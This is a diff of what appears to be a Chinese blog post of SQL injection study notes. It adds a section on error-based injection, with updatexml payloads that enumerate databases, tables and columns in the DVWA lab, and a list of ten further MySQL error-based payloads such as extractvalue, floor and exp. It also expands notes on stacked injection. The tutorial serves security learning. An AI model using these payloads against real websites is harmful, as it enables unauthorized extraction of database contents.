@@ -266,13 +266,46 @@ https://www.bugbank.cn/q/article/58afc3c06ef394d12a8a4379.html" />
 </li>
 </ol>
 </blockquote>
-<p><strong>堆叠注入</strong></p>
-<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。</p>
+<hr>
 <p><strong>报错注入</strong></p>
-<h3 id="3-无回显注入"><a href="#3-无回显注入" class="headerlink" title="3. 无回显注入"></a>3. 无回显注入</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfriend/p/11365999.html">https://www.cnblogs.com/sfriend/p/11365999.html</a></p>
-<p><strong>基于延时注入</strong></p>
+<p>当我们在应用中输入异常数据、或者使用内置函数报错导致SQL语句执行失败时，有的时候web服务器会返回错误信息。</p>
+<p>报错注入的本质是</p>
+<ol>
+<li>传入的参数中包含了内置函数</li>
+<li>内置函数的参数为获取信息的语句</li>
+<li>函数执行失败</li>
+<li>web服务器返回报错</li>
+</ol>
+<p>在dvwa中输入<code>1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) -- </code></p>
+<p>数据库会将<code>concat(0x7e,(select user()),0x7e)</code> 的结果值作为xmlpath,因为找不到这一路径导致报错</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210516221459561.png" alt="image-20210516221459561"></p>
+<p>将concat中的select user() 换成其他的值即可进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 0),0x7e),1) -- </span><br><span class="line"></span><br><span class="line">#获取数据表</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;dvwa&#39; limit 1 offset 0),0x7e),1) -- </span><br><span class="line"></span><br><span class="line">#获取列</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where TABLE_NAME&#x3D;&#39;guestbook&#39; limit 1 offset 1),0x7e),1) -- </span><br><span class="line"></span><br><span class="line">#获取信息</span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select comment from dvwa.guestbook limit 1 offset 0),0x7e),1) -- </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>常用函数以及payload</p>
+<ul>
+<li>floor()  #原理较为复杂,建议研究一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfriend/p/11365999.html">https://www.cnblogs.com/sfriend/p/11365999.html</a><br><code>1&#39; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --</code></li>
+<li>extractvalue()<br><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) --</code></li>
+<li>updatexml()<br><code>1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --</code></li>
+<li>geometrycollection()<br><code>1&#39; and geometrycollection((select * from(select * from(select user())a)b)) --</code></li>
+<li>multipoint()<br><code>1&#39; and  multipoint((select * from(select * from(select user())a)b)) --</code></li>
+<li>polygon()<br><code>1&#39; and polygon((select * from(select * from(select user())a)b)) --</code></li>
+<li>multipolygon()<br><code>1&#39; and  multipolygon((select * from(select * from(select user())a)b)) --</code></li>
+<li>linestring()<br><code>1&#39; and linestring((select * from(select * from(select user())a)b)) --</code></li>
+<li>multilinestring()<br><code>1&#39; and multilinestring((select * from(select * from(select user())a)b)) --</code></li>
+<li>exp()<br><code>1&#39; and exp(~(select * from(select user())a)) --</code></li>
+</ul>
+<hr>
+<p><strong>堆叠注入</strong></p>
+<p>堆叠注入的产生原因是一次执行多条SQL语句。</p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。</p>
+<p>如在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL。</p>
+<p>在正常应用中出现的可能性较低。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45146120/article/details/101037211">https://blog.csdn.net/weixin_45146120/article/details/101037211</a></p>
+<hr>
+<h3 id="3-无回显注入"><a href="#3-无回显注入" class="headerlink" title="3. 无回显注入"></a>3. 无回显注入</h3><p><strong>基于延时注入</strong></p>
 <p><strong>基于布尔注入</strong></p>
-<h3 id="4-二次注入"><a href="#4-二次注入" class="headerlink" title="4. 二次注入"></a>4. 二次注入</h3><h3 id="5-其他注入"><a href="#5-其他注入" class="headerlink" title="5. 其他注入"></a>5. 其他注入</h3><h2 id="防御SQL注入"><a href="#防御SQL注入" class="headerlink" title="防御SQL注入"></a>防御SQL注入</h2><h3 id="1-过滤敏感参数"><a href="#1-过滤敏感参数" class="headerlink" title="1. 过滤敏感参数"></a>1. 过滤敏感参数</h3><h3 id="2-使用参数化查询"><a href="#2-使用参数化查询" class="headerlink" title="2. 使用参数化查询"></a>2. 使用参数化查询</h3><h2 id="注入绕过"><a href="#注入绕过" class="headerlink" title="注入绕过"></a>注入绕过</h2><h2 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h2><p>在dvwa low测试中</p>
+<h3 id="4-二次注入"><a href="#4-二次注入" class="headerlink" title="4. 二次注入"></a>4. 二次注入</h3><h3 id="5-其他注入"><a href="#5-其他注入" class="headerlink" title="5. 其他注入"></a>5. 其他注入</h3><h2 id="防御SQL注入"><a href="#防御SQL注入" class="headerlink" title="防御SQL注入"></a>防御SQL注入</h2><h3 id="1-过滤敏感参数"><a href="#1-过滤敏感参数" class="headerlink" title="1. 过滤敏感参数"></a>1. 过滤敏感参数</h3><h3 id="2-使用参数化查询"><a href="#2-使用参数化查询" class="headerlink" title="2. 使用参数化查询"></a>2. 使用参数化查询</h3><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h2 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h2><p>在dvwa low测试中</p>
 <p>输入 1 和 1+字符串(如1a , 1aaaaaa) 返回结果相同</p>
 <p>而查询语句为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;1&#39;;</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;1a&#39;;</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;1aaaaaaa&#39;;</span><br></pre></td></tr></table></figure>
